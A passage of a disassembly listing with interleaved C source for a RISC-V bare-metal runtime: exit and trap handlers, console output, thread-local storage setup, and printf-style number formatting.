    80001926:	89e70713          	addi	a4,a4,-1890 # 8001b1c0 <counters>
    8000192a:	fdc42783          	lw	a5,-36(s0)
    8000192e:	078e                	slli	a5,a5,0x3
    80001930:	97ba                	add	a5,a5,a4
    80001932:	639c                	ld	a5,0(a5)
    80001934:	fe043703          	ld	a4,-32(s0)
    80001938:	40f707b3          	sub	a5,a4,a5
    8000193c:	fef43023          	sd	a5,-32(s0)
    80001940:	0001a717          	auipc	a4,0x1a
    80001944:	89070713          	addi	a4,a4,-1904 # 8001b1d0 <counter_names>
    80001948:	fdc42783          	lw	a5,-36(s0)
    8000194c:	078e                	slli	a5,a5,0x3
    8000194e:	97ba                	add	a5,a5,a4
    80001950:	00001717          	auipc	a4,0x1
    80001954:	d8070713          	addi	a4,a4,-640 # 800026d0 <atol+0xec>
    80001958:	e398                	sd	a4,0(a5)
    8000195a:	fdc42783          	lw	a5,-36(s0)
    8000195e:	0017871b          	addiw	a4,a5,1
    80001962:	fce42e23          	sw	a4,-36(s0)
    80001966:	0001a717          	auipc	a4,0x1a
    8000196a:	85a70713          	addi	a4,a4,-1958 # 8001b1c0 <counters>
    8000196e:	078e                	slli	a5,a5,0x3
    80001970:	97ba                	add	a5,a5,a4
    80001972:	fe043703          	ld	a4,-32(s0)
    80001976:	e398                	sd	a4,0(a5)

#undef READ_CTR
}
    80001978:	0001                	nop
    8000197a:	6426                	ld	s0,72(sp)
    8000197c:	6161                	addi	sp,sp,80
    8000197e:	8082                	ret

0000000080001980 <tohost_exit>:

void __attribute__((noreturn)) tohost_exit(uintptr_t code)
{
    80001980:	1101                	addi	sp,sp,-32
    80001982:	ec22                	sd	s0,24(sp)
    80001984:	1000                	addi	s0,sp,32
    80001986:	fea43423          	sd	a0,-24(s0)
  tohost = (code << 1) | 1;
    8000198a:	fe843783          	ld	a5,-24(s0)
    8000198e:	0786                	slli	a5,a5,0x1
    80001990:	0017e713          	ori	a4,a5,1
    80001994:	fffff797          	auipc	a5,0xfffff
    80001998:	66c78793          	addi	a5,a5,1644 # 80001000 <tohost>
    8000199c:	e398                	sd	a4,0(a5)
  while (1);
    8000199e:	a001                	j	8000199e <tohost_exit+0x1e>

00000000800019a0 <handle_trap>:
}

uintptr_t __attribute__((weak)) handle_trap(uintptr_t cause, uintptr_t epc, uintptr_t regs[32])
{
    800019a0:	7179                	addi	sp,sp,-48
    800019a2:	f406                	sd	ra,40(sp)
    800019a4:	f022                	sd	s0,32(sp)
    800019a6:	1800                	addi	s0,sp,48
    800019a8:	fea43423          	sd	a0,-24(s0)
    800019ac:	feb43023          	sd	a1,-32(s0)
    800019b0:	fcc43c23          	sd	a2,-40(s0)
  tohost_exit(1337);
    800019b4:	53900513          	li	a0,1337
    800019b8:	fc9ff0ef          	jal	ra,80001980 <tohost_exit>

00000000800019bc <exit>:
}

void exit(int code)
{
    800019bc:	1101                	addi	sp,sp,-32
    800019be:	ec06                	sd	ra,24(sp)
    800019c0:	e822                	sd	s0,16(sp)
    800019c2:	1000                	addi	s0,sp,32
    800019c4:	87aa                	mv	a5,a0
    800019c6:	fef42623          	sw	a5,-20(s0)
  tohost_exit(code);
    800019ca:	fec42783          	lw	a5,-20(s0)
    800019ce:	853e                	mv	a0,a5
    800019d0:	fb1ff0ef          	jal	ra,80001980 <tohost_exit>

00000000800019d4 <abort>:
}

void abort()
{
    800019d4:	1141                	addi	sp,sp,-16
    800019d6:	e406                	sd	ra,8(sp)
    800019d8:	e022                	sd	s0,0(sp)
    800019da:	0800                	addi	s0,sp,16
  exit(128 + SIGABRT);
    800019dc:	08600513          	li	a0,134
    800019e0:	fddff0ef          	jal	ra,800019bc <exit>

00000000800019e4 <printstr>:
}

void printstr(const char* s)
{
    800019e4:	7179                	addi	sp,sp,-48
    800019e6:	f406                	sd	ra,40(sp)
    800019e8:	f022                	sd	s0,32(sp)
    800019ea:	ec26                	sd	s1,24(sp)
    800019ec:	1800                	addi	s0,sp,48
    800019ee:	fca43c23          	sd	a0,-40(s0)
  syscall(SYS_write, 1, (uintptr_t)s, strlen(s));
    800019f2:	fd843483          	ld	s1,-40(s0)
    800019f6:	fd843503          	ld	a0,-40(s0)
    800019fa:	2a7000ef          	jal	ra,800024a0 <strlen>
    800019fe:	87aa                	mv	a5,a0
    80001a00:	86be                	mv	a3,a5
    80001a02:	8626                	mv	a2,s1
    80001a04:	4585                	li	a1,1
    80001a06:	04000513          	li	a0,64
    80001a0a:	df1ff0ef          	jal	ra,800017fa <syscall>
}
    80001a0e:	0001                	nop
    80001a10:	70a2                	ld	ra,40(sp)
    80001a12:	7402                	ld	s0,32(sp)
    80001a14:	64e2                	ld	s1,24(sp)
    80001a16:	6145                	addi	sp,sp,48
    80001a18:	8082                	ret

0000000080001a1a <thread_entry>:

void __attribute__((weak)) thread_entry(int cid, int nc)
{
    80001a1a:	1101                	addi	sp,sp,-32
    80001a1c:	ec22                	sd	s0,24(sp)
    80001a1e:	1000                	addi	s0,sp,32
    80001a20:	87aa                	mv	a5,a0
    80001a22:	872e                	mv	a4,a1
    80001a24:	fef42623          	sw	a5,-20(s0)
    80001a28:	87ba                	mv	a5,a4
    80001a2a:	fef42423          	sw	a5,-24(s0)
  // multi-threaded programs override this function.
  // for the case of single-threaded programs, only let core 0 proceed.
  while (cid != 0);
    80001a2e:	fec42783          	lw	a5,-20(s0)
    80001a32:	2781                	sext.w	a5,a5
    80001a34:	ffed                	bnez	a5,80001a2e <thread_entry+0x14>
}
    80001a36:	0001                	nop
    80001a38:	6462                	ld	s0,24(sp)
    80001a3a:	6105                	addi	sp,sp,32
    80001a3c:	8082                	ret

int __attribute__((weak)) main(int argc, char** argv)
{
    80001a3e:	1101                	addi	sp,sp,-32
    80001a40:	ec06                	sd	ra,24(sp)
    80001a42:	e822                	sd	s0,16(sp)
    80001a44:	1000                	addi	s0,sp,32
    80001a46:	87aa                	mv	a5,a0
    80001a48:	feb43023          	sd	a1,-32(s0)
    80001a4c:	fef42623          	sw	a5,-20(s0)
  // single-threaded programs override this function.
  printstr("Implement main(), foo!\n");
    80001a50:	00001517          	auipc	a0,0x1
    80001a54:	c9050513          	addi	a0,a0,-880 # 800026e0 <atol+0xfc>
    80001a58:	f8dff0ef          	jal	ra,800019e4 <printstr>
  return -1;
    80001a5c:	57fd                	li	a5,-1
}
    80001a5e:	853e                	mv	a0,a5
    80001a60:	60e2                	ld	ra,24(sp)
    80001a62:	6442                	ld	s0,16(sp)
    80001a64:	6105                	addi	sp,sp,32
    80001a66:	8082                	ret

0000000080001a68 <init_tls>:

static void init_tls()
{
    80001a68:	1101                	addi	sp,sp,-32
    80001a6a:	ec06                	sd	ra,24(sp)
    80001a6c:	e822                	sd	s0,16(sp)
    80001a6e:	1000                	addi	s0,sp,32
  register void* thread_pointer asm("tp");
  extern char _tls_data;
  extern __thread char _tdata_begin, _tdata_end, _tbss_end;
  size_t tdata_size = &_tdata_end - &_tdata_begin;
    80001a70:	00020713          	mv	a4,tp
    80001a74:	00020793          	mv	a5,tp
    80001a78:	40f707b3          	sub	a5,a4,a5
    80001a7c:	fef43423          	sd	a5,-24(s0)
  memcpy(thread_pointer, &_tls_data, tdata_size);
    80001a80:	8792                	mv	a5,tp
    80001a82:	fe843603          	ld	a2,-24(s0)
    80001a86:	00019597          	auipc	a1,0x19
    80001a8a:	77a58593          	addi	a1,a1,1914 # 8001b200 <_end>
    80001a8e:	853e                	mv	a0,a5
    80001a90:	08b000ef          	jal	ra,8000231a <memcpy>
  size_t tbss_size = &_tbss_end - &_tdata_end;
    80001a94:	08420713          	addi	a4,tp,132 # 84 <_tbss_end>
    80001a98:	00020793          	mv	a5,tp
    80001a9c:	40f707b3          	sub	a5,a4,a5
    80001aa0:	fef43023          	sd	a5,-32(s0)
  memset(thread_pointer + tdata_size, 0, tbss_size);
    80001aa4:	8712                	mv	a4,tp
    80001aa6:	fe843783          	ld	a5,-24(s0)
    80001aaa:	97ba                	add	a5,a5,a4
    80001aac:	fe043603          	ld	a2,-32(s0)
    80001ab0:	4581                	li	a1,0
    80001ab2:	853e                	mv	a0,a5
    80001ab4:	11f000ef          	jal	ra,800023d2 <memset>
}
    80001ab8:	0001                	nop
    80001aba:	60e2                	ld	ra,24(sp)
    80001abc:	6442                	ld	s0,16(sp)
    80001abe:	6105                	addi	sp,sp,32
    80001ac0:	8082                	ret

0000000080001ac2 <_init>:

void _init(int cid, int nc)
{
    80001ac2:	7131                	addi	sp,sp,-192
    80001ac4:	fd06                	sd	ra,184(sp)
    80001ac6:	f922                	sd	s0,176(sp)
    80001ac8:	f526                	sd	s1,168(sp)
    80001aca:	0180                	addi	s0,sp,192
    80001acc:	87aa                	mv	a5,a0
    80001ace:	872e                	mv	a4,a1
    80001ad0:	f4f42623          	sw	a5,-180(s0)
    80001ad4:	87ba                	mv	a5,a4
    80001ad6:	f4f42423          	sw	a5,-184(s0)
    80001ada:	fe040793          	addi	a5,s0,-32
    80001ade:	f7078793          	addi	a5,a5,-144
    80001ae2:	03f78793          	addi	a5,a5,63
    80001ae6:	8399                	srli	a5,a5,0x6
    80001ae8:	00679493          	slli	s1,a5,0x6
  init_tls();
    80001aec:	f7dff0ef          	jal	ra,80001a68 <init_tls>
  thread_entry(cid, nc);
    80001af0:	f4842703          	lw	a4,-184(s0)
    80001af4:	f4c42783          	lw	a5,-180(s0)
    80001af8:	85ba                	mv	a1,a4
    80001afa:	853e                	mv	a0,a5
    80001afc:	f1fff0ef          	jal	ra,80001a1a <thread_entry>

  // only single-threaded programs should ever get here.
  int ret = main(0, 0);
    80001b00:	4581                	li	a1,0
    80001b02:	4501                	li	a0,0
    80001b04:	fbeff0ef          	jal	ra,800012c2 <main>
    80001b08:	87aa                	mv	a5,a0
    80001b0a:	fcf42823          	sw	a5,-48(s0)

  char buf[NUM_COUNTERS * 32] __attribute__((aligned(64)));
  char* pbuf = buf;
    80001b0e:	fc943c23          	sd	s1,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001b12:	fc042a23          	sw	zero,-44(s0)
    80001b16:	a095                	j	80001b7a <_init+0xb8>
    if (counters[i])
    80001b18:	00019717          	auipc	a4,0x19
    80001b1c:	6a870713          	addi	a4,a4,1704 # 8001b1c0 <counters>
    80001b20:	fd442783          	lw	a5,-44(s0)
    80001b24:	078e                	slli	a5,a5,0x3
    80001b26:	97ba                	add	a5,a5,a4
    80001b28:	639c                	ld	a5,0(a5)
    80001b2a:	c3b9                	beqz	a5,80001b70 <_init+0xae>
      pbuf += sprintf(pbuf, "%s = %ld\n", counter_names[i], counters[i]);
    80001b2c:	00019717          	auipc	a4,0x19
    80001b30:	6a470713          	addi	a4,a4,1700 # 8001b1d0 <counter_names>
    80001b34:	fd442783          	lw	a5,-44(s0)
    80001b38:	078e                	slli	a5,a5,0x3
    80001b3a:	97ba                	add	a5,a5,a4
    80001b3c:	6390                	ld	a2,0(a5)
    80001b3e:	00019717          	auipc	a4,0x19
    80001b42:	68270713          	addi	a4,a4,1666 # 8001b1c0 <counters>
    80001b46:	fd442783          	lw	a5,-44(s0)
    80001b4a:	078e                	slli	a5,a5,0x3
    80001b4c:	97ba                	add	a5,a5,a4
    80001b4e:	639c                	ld	a5,0(a5)
    80001b50:	86be                	mv	a3,a5
    80001b52:	00001597          	auipc	a1,0x1
    80001b56:	ba658593          	addi	a1,a1,-1114 # 800026f8 <atol+0x114>
    80001b5a:	fd843503          	ld	a0,-40(s0)
    80001b5e:	708000ef          	jal	ra,80002266 <sprintf>
    80001b62:	87aa                	mv	a5,a0
    80001b64:	873e                	mv	a4,a5
    80001b66:	fd843783          	ld	a5,-40(s0)
    80001b6a:	97ba                	add	a5,a5,a4
    80001b6c:	fcf43c23          	sd	a5,-40(s0)
  for (int i = 0; i < NUM_COUNTERS; i++)
    80001b70:	fd442783          	lw	a5,-44(s0)
    80001b74:	2785                	addiw	a5,a5,1
    80001b76:	fcf42a23          	sw	a5,-44(s0)
    80001b7a:	fd442783          	lw	a5,-44(s0)
    80001b7e:	0007871b          	sext.w	a4,a5
    80001b82:	4785                	li	a5,1
    80001b84:	f8e7dae3          	ble	a4,a5,80001b18 <_init+0x56>
  if (pbuf != buf)
    80001b88:	fd843783          	ld	a5,-40(s0)
    80001b8c:	00f48563          	beq	s1,a5,80001b96 <_init+0xd4>
    printstr(buf);
    80001b90:	8526                	mv	a0,s1
    80001b92:	e53ff0ef          	jal	ra,800019e4 <printstr>

  exit(ret);
    80001b96:	fd042783          	lw	a5,-48(s0)
    80001b9a:	853e                	mv	a0,a5
    80001b9c:	e21ff0ef          	jal	ra,800019bc <exit>

0000000080001ba0 <putchar>:
}

#undef putchar
int putchar(int ch)
{
    80001ba0:	1101                	addi	sp,sp,-32
    80001ba2:	ec06                	sd	ra,24(sp)
    80001ba4:	e822                	sd	s0,16(sp)
    80001ba6:	1000                	addi	s0,sp,32
    80001ba8:	87aa                	mv	a5,a0
    80001baa:	fef42623          	sw	a5,-20(s0)
  static __thread char buf[64] __attribute__((aligned(64)));
  static __thread int buflen = 0;

  buf[buflen++] = ch;
    80001bae:	08022783          	lw	a5,128(tp) # 80 <buflen.2849>
    80001bb2:	0017871b          	addiw	a4,a5,1
    80001bb6:	0007069b          	sext.w	a3,a4
    80001bba:	08d22023          	sw	a3,128(tp) # 80 <buflen.2849>
    80001bbe:	fec42703          	lw	a4,-20(s0)
    80001bc2:	0ff77713          	andi	a4,a4,255
    80001bc6:	04020693          	addi	a3,tp,64 # 40 <buf.2848>
    80001bca:	97b6                	add	a5,a5,a3
    80001bcc:	00e78023          	sb	a4,0(a5)

  if (ch == '\n' || buflen == sizeof(buf))
    80001bd0:	fec42783          	lw	a5,-20(s0)
    80001bd4:	0007871b          	sext.w	a4,a5
    80001bd8:	47a9                	li	a5,10
    80001bda:	00f70963          	beq	a4,a5,80001bec <putchar+0x4c>
    80001bde:	08022783          	lw	a5,128(tp) # 80 <buflen.2849>
    80001be2:	873e                	mv	a4,a5
    80001be4:	04000793          	li	a5,64
    80001be8:	00f71f63          	bne	a4,a5,80001c06 <putchar+0x66>
  {
    syscall(SYS_write, 1, (uintptr_t)buf, buflen);
    80001bec:	04020713          	addi	a4,tp,64 # 40 <buf.2848>
    80001bf0:	08022783          	lw	a5,128(tp) # 80 <buflen.2849>
    80001bf4:	86be                	mv	a3,a5
    80001bf6:	863a                	mv	a2,a4
    80001bf8:	4585                	li	a1,1
    80001bfa:	04000513          	li	a0,64
    80001bfe:	bfdff0ef          	jal	ra,800017fa <syscall>
    buflen = 0;
    80001c02:	08022023          	sw	zero,128(tp) # 80 <buflen.2849>
  }

  return 0;
    80001c06:	4781                	li	a5,0
}
    80001c08:	853e                	mv	a0,a5
    80001c0a:	60e2                	ld	ra,24(sp)
    80001c0c:	6442                	ld	s0,16(sp)
    80001c0e:	6105                	addi	sp,sp,32
    80001c10:	8082                	ret

0000000080001c12 <printhex>:

void printhex(uint64_t x)
{
    80001c12:	7139                	addi	sp,sp,-64
    80001c14:	fc06                	sd	ra,56(sp)
    80001c16:	f822                	sd	s0,48(sp)
    80001c18:	0080                	addi	s0,sp,64
    80001c1a:	fca43423          	sd	a0,-56(s0)
  char str[17];
  int i;
  for (i = 0; i < 16; i++)
    80001c1e:	fe042623          	sw	zero,-20(s0)
    80001c22:	a8a1                	j	80001c7a <printhex+0x68>
  {
    str[15-i] = (x & 0xF) + ((x & 0xF) < 10 ? '0' : 'a'-10);
    80001c24:	fc843783          	ld	a5,-56(s0)
    80001c28:	0ff7f793          	andi	a5,a5,255
    80001c2c:	8bbd                	andi	a5,a5,15
    80001c2e:	0ff7f713          	andi	a4,a5,255
    80001c32:	fc843783          	ld	a5,-56(s0)
    80001c36:	00f7f693          	andi	a3,a5,15
    80001c3a:	47a5                	li	a5,9
    80001c3c:	00d7e563          	bltu	a5,a3,80001c46 <printhex+0x34>
    80001c40:	03000793          	li	a5,48
    80001c44:	a019                	j	80001c4a <printhex+0x38>
    80001c46:	05700793          	li	a5,87
    80001c4a:	463d                	li	a2,15
    80001c4c:	fec42683          	lw	a3,-20(s0)
    80001c50:	40d606bb          	subw	a3,a2,a3
    80001c54:	2681                	sext.w	a3,a3
    80001c56:	9fb9                	addw	a5,a5,a4
    80001c58:	0ff7f713          	andi	a4,a5,255
    80001c5c:	ff040793          	addi	a5,s0,-16
    80001c60:	97b6                	add	a5,a5,a3
    80001c62:	fee78423          	sb	a4,-24(a5)
    x >>= 4;
    80001c66:	fc843783          	ld	a5,-56(s0)
    80001c6a:	8391                	srli	a5,a5,0x4
    80001c6c:	fcf43423          	sd	a5,-56(s0)
  for (i = 0; i < 16; i++)
    80001c70:	fec42783          	lw	a5,-20(s0)
    80001c74:	2785                	addiw	a5,a5,1
    80001c76:	fef42623          	sw	a5,-20(s0)
    80001c7a:	fec42783          	lw	a5,-20(s0)
    80001c7e:	0007871b          	sext.w	a4,a5
    80001c82:	47bd                	li	a5,15
    80001c84:	fae7d0e3          	ble	a4,a5,80001c24 <printhex+0x12>
  }
  str[16] = 0;
    80001c88:	fe040423          	sb	zero,-24(s0)

  printstr(str);
    80001c8c:	fd840793          	addi	a5,s0,-40
    80001c90:	853e                	mv	a0,a5
    80001c92:	d53ff0ef          	jal	ra,800019e4 <printstr>
}
    80001c96:	0001                	nop
    80001c98:	70e2                	ld	ra,56(sp)
    80001c9a:	7442                	ld	s0,48(sp)
    80001c9c:	6121                	addi	sp,sp,64
    80001c9e:	8082                	ret

0000000080001ca0 <printnum>:

static inline void printnum(void (*putch)(int, void**), void **putdat,
                    unsigned long long num, unsigned base, int width, int padc)
{
    80001ca0:	714d                	addi	sp,sp,-336
    80001ca2:	e686                	sd	ra,328(sp)
    80001ca4:	e2a2                	sd	s0,320(sp)
    80001ca6:	0a80                	addi	s0,sp,336
    80001ca8:	eca43c23          	sd	a0,-296(s0)
    80001cac:	ecb43823          	sd	a1,-304(s0)
    80001cb0:	ecc43423          	sd	a2,-312(s0)
    80001cb4:	8636                	mv	a2,a3
    80001cb6:	86ba                	mv	a3,a4
    80001cb8:	873e                	mv	a4,a5
    80001cba:	87b2                	mv	a5,a2
    80001cbc:	ecf42223          	sw	a5,-316(s0)
    80001cc0:	87b6                	mv	a5,a3
    80001cc2:	ecf42023          	sw	a5,-320(s0)
    80001cc6:	87ba                	mv	a5,a4
    80001cc8:	eaf42e23          	sw	a5,-324(s0)
  unsigned digs[sizeof(num)*CHAR_BIT];
  int pos = 0;
    80001ccc:	fe042623          	sw	zero,-20(s0)

  while (1)
  {
    digs[pos++] = num % base;
    80001cd0:	ec446783          	lwu	a5,-316(s0)
    80001cd4:	ec843703          	ld	a4,-312(s0)
    80001cd8:	02f776b3          	remu	a3,a4,a5
    80001cdc:	fec42783          	lw	a5,-20(s0)
    80001ce0:	0017871b          	addiw	a4,a5,1
    80001ce4:	fee42623          	sw	a4,-20(s0)
    80001ce8:	0006871b          	sext.w	a4,a3
    80001cec:	078a                	slli	a5,a5,0x2
    80001cee:	ff040693          	addi	a3,s0,-16
    80001cf2:	97b6                	add	a5,a5,a3
    80001cf4:	eee7ac23          	sw	a4,-264(a5)
    if (num < base)
    80001cf8:	ec446783          	lwu	a5,-316(s0)
    80001cfc:	ec843703          	ld	a4,-312(s0)
    80001d00:	00f76b63          	bltu	a4,a5,80001d16 <printnum+0x76>
      break;
    num /= base;
    80001d04:	ec446783          	lwu	a5,-316(s0)
    80001d08:	ec843703          	ld	a4,-312(s0)
    80001d0c:	02f757b3          	divu	a5,a4,a5
    80001d10:	ecf43423          	sd	a5,-312(s0)
    digs[pos++] = num % base;
    80001d14:	bf75                	j	80001cd0 <printnum+0x30>
      break;
    80001d16:	0001                	nop
  }

  while (width-- > pos)
    80001d18:	a809                	j	80001d2a <printnum+0x8a>
    putch(padc, putdat);
    80001d1a:	ebc42783          	lw	a5,-324(s0)
    80001d1e:	ed843703          	ld	a4,-296(s0)
    80001d22:	ed043583          	ld	a1,-304(s0)
    80001d26:	853e                	mv	a0,a5
    80001d28:	9702                	jalr	a4
  while (width-- > pos)
    80001d2a:	ec042783          	lw	a5,-320(s0)
    80001d2e:	fff7871b          	addiw	a4,a5,-1
    80001d32:	ece42023          	sw	a4,-320(s0)
    80001d36:	fec42703          	lw	a4,-20(s0)
    80001d3a:	2701                	sext.w	a4,a4
    80001d3c:	fcf74fe3          	blt	a4,a5,80001d1a <printnum+0x7a>

  while (pos-- > 0)
    80001d40:	a099                	j	80001d86 <printnum+0xe6>
    putch(digs[pos] + (digs[pos] >= 10 ? 'a' - 10 : '0'), putdat);
    80001d42:	fec42783          	lw	a5,-20(s0)
    80001d46:	078a                	slli	a5,a5,0x2
    80001d48:	ff040713          	addi	a4,s0,-16
    80001d4c:	97ba                	add	a5,a5,a4
    80001d4e:	ef87a703          	lw	a4,-264(a5)
    80001d52:	fec42783          	lw	a5,-20(s0)
    80001d56:	078a                	slli	a5,a5,0x2
    80001d58:	ff040693          	addi	a3,s0,-16
    80001d5c:	97b6                	add	a5,a5,a3
    80001d5e:	ef87a783          	lw	a5,-264(a5)
    80001d62:	86be                	mv	a3,a5
    80001d64:	47a5                	li	a5,9
    80001d66:	00d7f563          	bleu	a3,a5,80001d70 <printnum+0xd0>
    80001d6a:	05700793          	li	a5,87
    80001d6e:	a019                	j	80001d74 <printnum+0xd4>
    80001d70:	03000793          	li	a5,48
    80001d74:	9fb9                	addw	a5,a5,a4
    80001d76:	2781                	sext.w	a5,a5
    80001d78:	2781                	sext.w	a5,a5
    80001d7a:	ed843703          	ld	a4,-296(s0)
    80001d7e:	ed043583          	ld	a1,-304(s0)
    80001d82:	853e                	mv	a0,a5
    80001d84:	9702                	jalr	a4
  while (pos-- > 0)
    80001d86:	fec42783          	lw	a5,-20(s0)
    80001d8a:	fff7871b          	addiw	a4,a5,-1
    80001d8e:	fee42623          	sw	a4,-20(s0)
    80001d92:	faf048e3          	bgtz	a5,80001d42 <printnum+0xa2>
}
    80001d96:	0001                	nop
    80001d98:	60b6                	ld	ra,328(sp)
    80001d9a:	6416                	ld	s0,320(sp)
    80001d9c:	6171                	addi	sp,sp,336
    80001d9e:	8082                	ret

0000000080001da0 <getuint>:

static unsigned long long getuint(va_list *ap, int lflag)
{
    80001da0:	1101                	addi	sp,sp,-32
    80001da2:	ec22                	sd	s0,24(sp)
    80001da4:	1000                	addi	s0,sp,32
    80001da6:	fea43423          	sd	a0,-24(s0)
    80001daa:	87ae                	mv	a5,a1
    80001dac:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001db0:	fe442783          	lw	a5,-28(s0)
    80001db4:	0007871b          	sext.w	a4,a5
    80001db8:	4785                	li	a5,1
    80001dba:	00e7dc63          	ble	a4,a5,80001dd2 <getuint+0x32>
    return va_arg(*ap, unsigned long long);
    80001dbe:	fe843783          	ld	a5,-24(s0)
    80001dc2:	639c                	ld	a5,0(a5)
    80001dc4:	00878693          	addi	a3,a5,8
    80001dc8:	fe843703          	ld	a4,-24(s0)
    80001dcc:	e314                	sd	a3,0(a4)
    80001dce:	639c                	ld	a5,0(a5)
    80001dd0:	a815                	j	80001e04 <getuint+0x64>
  else if (lflag)
    80001dd2:	fe442783          	lw	a5,-28(s0)
    80001dd6:	2781                	sext.w	a5,a5
    80001dd8:	cb99                	beqz	a5,80001dee <getuint+0x4e>
    return va_arg(*ap, unsigned long);
    80001dda:	fe843783          	ld	a5,-24(s0)
    80001dde:	639c                	ld	a5,0(a5)
    80001de0:	00878693          	addi	a3,a5,8
    80001de4:	fe843703          	ld	a4,-24(s0)
    80001de8:	e314                	sd	a3,0(a4)
    80001dea:	639c                	ld	a5,0(a5)
    80001dec:	a821                	j	80001e04 <getuint+0x64>
  else
    return va_arg(*ap, unsigned int);
    80001dee:	fe843783          	ld	a5,-24(s0)
    80001df2:	639c                	ld	a5,0(a5)
    80001df4:	00878693          	addi	a3,a5,8
    80001df8:	fe843703          	ld	a4,-24(s0)
    80001dfc:	e314                	sd	a3,0(a4)
    80001dfe:	439c                	lw	a5,0(a5)
    80001e00:	1782                	slli	a5,a5,0x20
    80001e02:	9381                	srli	a5,a5,0x20
}
    80001e04:	853e                	mv	a0,a5
    80001e06:	6462                	ld	s0,24(sp)
    80001e08:	6105                	addi	sp,sp,32
    80001e0a:	8082                	ret

0000000080001e0c <getint>:

static long long getint(va_list *ap, int lflag)
{
    80001e0c:	1101                	addi	sp,sp,-32
    80001e0e:	ec22                	sd	s0,24(sp)
    80001e10:	1000                	addi	s0,sp,32
    80001e12:	fea43423          	sd	a0,-24(s0)
    80001e16:	87ae                	mv	a5,a1
    80001e18:	fef42223          	sw	a5,-28(s0)
  if (lflag >= 2)
    80001e1c:	fe442783          	lw	a5,-28(s0)
    80001e20:	0007871b          	sext.w	a4,a5
    80001e24:	4785                	li	a5,1
    80001e26:	00e7dc63          	ble	a4,a5,80001e3e <getint+0x32>
    return va_arg(*ap, long long);
    80001e2a:	fe843783          	ld	a5,-24(s0)
    80001e2e:	639c                	ld	a5,0(a5)
    80001e30:	00878693          	addi	a3,a5,8
    80001e34:	fe843703          	ld	a4,-24(s0)
    80001e38:	e314                	sd	a3,0(a4)
    80001e3a:	639c                	ld	a5,0(a5)
    80001e3c:	a805                	j	80001e6c <getint+0x60>
  else if (lflag)
    80001e3e:	fe442783          	lw	a5,-28(s0)
    80001e42:	2781                	sext.w	a5,a5
    80001e44:	cb99                	beqz	a5,80001e5a <getint+0x4e>
    return va_arg(*ap, long);
    80001e46:	fe843783          	ld	a5,-24(s0)
    80001e4a:	639c                	ld	a5,0(a5)
    80001e4c:	00878693          	addi	a3,a5,8
    80001e50:	fe843703          	ld	a4,-24(s0)
    80001e54:	e314                	sd	a3,0(a4)
    80001e56:	639c                	ld	a5,0(a5)
    80001e58:	a811                	j	80001e6c <getint+0x60>
  else
    return va_arg(*ap, int);
    80001e5a:	fe843783          	ld	a5,-24(s0)
    80001e5e:	639c                	ld	a5,0(a5)
    80001e60:	00878693          	addi	a3,a5,8
    80001e64:	fe843703          	ld	a4,-24(s0)
    80001e68:	e314                	sd	a3,0(a4)
    80001e6a:	439c                	lw	a5,0(a5)
}
    80001e6c:	853e                	mv	a0,a5
    80001e6e:	6462                	ld	s0,24(sp)
    80001e70:	6105                	addi	sp,sp,32
    80001e72:	8082                	ret

0000000080001e74 <vprintfmt>:

static void vprintfmt(void (*putch)(int, void**), void **putdat, const char *fmt, va_list ap)
{
    80001e74:	7159                	addi	sp,sp,-112
    80001e76:	f486                	sd	ra,104(sp)
    80001e78:	f0a2                	sd	s0,96(sp)
    80001e7a:	eca6                	sd	s1,88(sp)
    80001e7c:	e8ca                	sd	s2,80(sp)
    80001e7e:	1880                	addi	s0,sp,112
    80001e80:	faa43423          	sd	a0,-88(s0)
    80001e84:	fab43023          	sd	a1,-96(s0)
    80001e88:	f8c43c23          	sd	a2,-104(s0)
    80001e8c:	f8d43823          	sd	a3,-112(s0)
  unsigned long long num;
  int base, lflag, width, precision, altflag;
  char padc;

  while (1) {
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001e90:	a831                	j	80001eac <vprintfmt+0x38>
      if (ch == '\0')
    80001e92:	32048963          	beqz	s1,800021c4 <vprintfmt+0x350>
        return;
      fmt++;
    80001e96:	f9843783          	ld	a5,-104(s0)
    80001e9a:	0785                	addi	a5,a5,1
    80001e9c:	f8f43c23          	sd	a5,-104(s0)
      putch(ch, putdat);
    80001ea0:	fa843783          	ld	a5,-88(s0)
    80001ea4:	fa043583          	ld	a1,-96(s0)
    80001ea8:	8526                	mv	a0,s1
    80001eaa:	9782                	jalr	a5
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001eac:	f9843783          	ld	a5,-104(s0)
    80001eb0:	0007c783          	lbu	a5,0(a5)
    80001eb4:	0007849b          	sext.w	s1,a5
    80001eb8:	8726                	mv	a4,s1
    80001eba:	02500793          	li	a5,37
    80001ebe:	fcf71ae3          	bne	a4,a5,80001e92 <vprintfmt+0x1e>
    }
    fmt++;
    80001ec2:	f9843783          	ld	a5,-104(s0)
    80001ec6:	0785                	addi	a5,a5,1
    80001ec8:	f8f43c23          	sd	a5,-104(s0)

    // Process a %-escape sequence
    last_fmt = fmt;
    80001ecc:	f9843783          	ld	a5,-104(s0)
    80001ed0:	faf43c23          	sd	a5,-72(s0)
    padc = ' ';
    80001ed4:	02000793          	li	a5,32
    80001ed8:	fcf403a3          	sb	a5,-57(s0)
    width = -1;
    80001edc:	57fd                	li	a5,-1
    80001ede:	fcf42623          	sw	a5,-52(s0)
    precision = -1;
    80001ee2:	57fd                	li	a5,-1
    80001ee4:	fcf42423          	sw	a5,-56(s0)
    lflag = 0;
    80001ee8:	fc042823          	sw	zero,-48(s0)
    altflag = 0;
    80001eec:	fa042a23          	sw	zero,-76(s0)
  reswitch:
    switch (ch = *(unsigned char *) fmt++) {
    80001ef0:	f9843783          	ld	a5,-104(s0)
    80001ef4:	00178713          	addi	a4,a5,1
    80001ef8:	f8e43c23          	sd	a4,-104(s0)
    80001efc:	0007c783          	lbu	a5,0(a5)
    80001f00:	0007849b          	sext.w	s1,a5
    80001f04:	fdd4869b          	addiw	a3,s1,-35
    80001f08:	0006871b          	sext.w	a4,a3
    80001f0c:	05500793          	li	a5,85
    80001f10:	28e7ed63          	bltu	a5,a4,800021aa <vprintfmt+0x336>
    80001f14:	02069793          	slli	a5,a3,0x20
    80001f18:	9381                	srli	a5,a5,0x20
    80001f1a:	00279713          	slli	a4,a5,0x2
    80001f1e:	00000797          	auipc	a5,0x0
    80001f22:	7f278793          	addi	a5,a5,2034 # 80002710 <atol+0x12c>
    80001f26:	97ba                	add	a5,a5,a4
    80001f28:	439c                	lw	a5,0(a5)
    80001f2a:	0007871b          	sext.w	a4,a5
